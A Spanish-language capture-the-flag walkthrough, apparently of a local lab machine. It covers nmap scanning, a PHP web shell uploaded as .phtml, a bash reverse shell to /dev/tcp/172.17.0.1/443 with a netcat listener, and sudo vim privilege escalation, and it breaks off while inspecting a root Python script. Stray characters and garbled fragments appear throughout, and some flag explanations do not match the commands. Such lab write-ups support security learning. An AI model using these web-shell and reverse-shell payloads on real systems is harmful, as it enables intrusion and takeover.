<img width="891" height="453" alt="image" src="https://github.com/user-attachments/assets/15623985-c6a6-4478-834a-edff585489bd" />


#  Escaneo de  servicios  y puertos y serviicios 

```ruby
nmap -p- --open -sS --min-rate 5000 -n -v -Pn -sCV -oN targeted.txt 172.17.0.2
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-07 10:43 -0500
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 8080/tcp on 172.17.0.2
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.62 (Debian)
8080/tcp open  http    SimpleHTTPServer 0.6 (Python 3.11.2)
|_http-title: Directory listing for /
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: SimpleHTTP/0.6 Python/3.11.2
MAC Address: 02:42:AC:11:00:02 (Unknown)

     (-p-): todo el rango de puertos

    (--open): solo reportar los puertos abiertos

    (-sS): usar el método de escaneo SYN, que es más sigiloso y rápido que el normal. Requiere privilegios a nivel de sistema para enviar raw packets

    (--min-rate:)5000 enviar como mínimo 5000 paquetes por segundo

    -vvv: triple verbose. Nada más descubrir un puerto lo muestra por pantalla, también muestra más información de lo normal sobre el escaneo

    (-n) : no hacer resolución DNS

    (-Pn) no hacer host discovery

    (-oG) tcp_ports exportar el output en formato grepeable al archivo tcp_ports
```
# puertos abiertos 

Hacemos un escaneo de servicios y versiones sobre el puerto 80:
```ruby
nmap -p80 -sCV 172.17.0.2 -oN targeted
tarting Nmap 7.98 ( https://nmap.org ) at 2026-02-07 10:48 -0500
Nmap scan report for 172.17.0.2
Host is up (0.000043s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    ApSache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.89 seconds

    -p22,80 hacer el escaneo solo sobre los puertos 22 y 80

    -sCV lanzar escaneo de versiones y scripts estándar de reconocimiento

    -oN targeted exportar el output al archivo targeted, en formato nmapSSSubir archivo` nos lleva a un panel de subida de archivos:
```

Vemos esta web bastante simple. Pone "Sube tu archivo", y arriva tenemos una barra de navegación. SI clicamos en Inicio nos lleva al `index.html`, y si clicamos en `Subir archivo` nos lleva a un panel de subida de archivos:
<img width="679" height="193" alt="image" src="https://github.com/user-attachments/assets/102a0d2f-4105-47f5-9569-58fcb1254f84" />

Probamos a subir directamente un archivo `.phtml` este contenido:
```ruby
<?php
    system($_GET['cmd']);S
```
si lo hacen con la extencion php normal no los va dejar pueden ir probando otras extensiones PHP, mirando en `HackTricks`.


# INTRUSIÓN

Nos ponemos en escucha:
```ruby
nc -nlvp 443
```
Y ejecutamos la reverse shell:S
```rubySS
http://172.17.0.2/uploads/rce.phtml?cmd=/bin/bash -c "bash -i >%26 /dev/tcp/172.17.0.1/443 0>%261"
```
S
# TRATAMIENTO TTY
```ruby
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fgS
reset
xterm
export TERM=xterm
export SHELL=bash
stty rows <filas> columns <columnas>
```
Para ver el número de filas y columnas que usa tu pantalla, ejecutas `stty -a`.

# ESCALADA DE PRIVILEGIOS
# Jerry
Somos www-data. Ejecutamos sudo -lpara ver si tenemos privilegios de sudo:SSS
<img width="544" height="130" alt="image" src="https://github.com/user-attachments/assets/669170af-09a6-4974-982a-3c16156cda07" />

Podemos ejecutar como el usuario jerry, sin poner contraseña, el binario vim.  Gracias a `gtfobins`

sabemos que podemos ejecutar comandos usando ese binario de esta forma:
```ruby
sudo -u jerry vim
```
Y dentro del editor de VIM ejecutamos:
```ruby
:!bash
```
<img width="547" height="89" alt="image" src="https://github.com/user-attachments/assets/5799f754-68bc-4084-ba78-40a0ddddba62" />

# ROOT
Siendo ya el usuario jerry, ejecutamos otra vez `sudo -l`:

Tenemos varios privilegios. El que más llama la atención es un script de python3 llamado command_exec.py, así que probamos a ejecutarlo:
S
```ruby
sudo /usr/bin/python3 /opt/command_exec/command_exec.py
```
<img width="833" height="59" alt="image" src="https://github.com/user-attachments/assets/fae59ed4-b83f-49e3-aad1-f860d3ff6268" />

Nos dice "Denegado". Para saber la razón, inspeccionamos el código del script:
```python
#!/usr/bin/python3

import os, sys

def main():

    with open("/opt/command_exec/flag.txt", "r") as flag_file:

        content = flag_file.readlines()[0]

        if content == "ACTIVE":

            print("Autorizado\n")

            cmd = input("Escribe un comando: ")

            os.system(cmd)

        else:

            print("Denegado")
            sys.exit(1)


if __name__ == '__main__':

    main()
```
